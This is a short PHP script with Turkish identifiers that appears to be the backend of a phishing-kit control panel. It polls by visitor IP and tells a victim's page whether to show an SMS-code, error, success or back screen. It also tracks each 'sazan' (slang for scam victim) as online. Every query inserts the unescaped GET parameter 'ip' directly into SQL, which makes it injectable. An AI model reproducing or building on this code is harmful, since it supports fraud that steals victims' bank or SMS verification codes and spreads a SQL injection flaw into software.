<?php

include ('mysql.php');
$mysqli = $_SESSION["mysqli"];
$queryid = $_SESSION["query"];
$ip = $_GET["ip"];

$sms = mysqli_query($mysqli, "SELECT * FROM sms");
foreach ($sms as $row1)
{
    if ($row1['sms'] == $ip)
    {
        echo 'sms';
        mysqli_query($mysqli, "DELETE FROM sms WHERE sms='$ip'");
    }
}

$tebrik = mysqli_query($mysqli, "SELECT * FROM tebrik");
foreach ($tebrik as $row2)
{
    if ($row2['tebrik'] == $ip)
    {
        echo "tebrik";
        mysqli_query($mysqli, "DELETE FROM tebrik WHERE tebrik='$ip'");
    }
}

$hata1 = mysqli_query($mysqli, "SELECT * FROM hata1");
foreach ($hata1 as $row4)
{
    if ($row4['hata1'] == $ip)
    {
        echo "hata1";
        mysqli_query($mysqli, "DELETE FROM hata1 WHERE hata1='$ip'");
    }
}

$hata2 = mysqli_query($mysqli, "SELECT * FROM hata2");
foreach ($hata2 as $row4)
{
    if ($row4['hata2'] == $ip)
    {
        echo "hata2";
        mysqli_query($mysqli, "DELETE FROM hata2 WHERE hata2='$ip'");
    }
}

$hata3 = mysqli_query($mysqli, "SELECT * FROM hata3");
foreach ($hata3 as $row4)
{
    if ($row4['hata3'] == $ip)
    {
        echo "hata3";
        mysqli_query($mysqli, "DELETE FROM hata3 WHERE hata3='$ip'");
    }
}

$back = mysqli_query($mysqli, "SELECT * FROM back");
foreach ($back as $row6)
{
    if ($row6['back'] == $ip)
    {
        echo "back";
        mysqli_query($mysqli, "UPDATE sazan SET back = '0' WHERE id = '{$queryid}'");
        mysqli_query($mysqli, "DELETE FROM back WHERE back='$ip'");
    }
}

if ($_GET["ip"])
{
    $timex = time() + 7;
 
    $query = mysqli_query($mysqli, "SELECT * FROM ips WHERE ipAddress = '$ip'");
	$sonuc = mysqli_fetch_array($query);
    if ($sonuc)
    {
        mysqli_query($mysqli, "UPDATE ips SET lastOnline = '$timex' WHERE ipAddress = '$ip'");
    }
    else
    {
		mysqli_query($mysqli, "INSERT INTO ips SET ipAddress = '$ip', lastOnline = '$timex'");
    }
	mysqli_query($mysqli, "UPDATE sazan SET lastOnline = '$timex' WHERE id = '$queryid'");
}
?>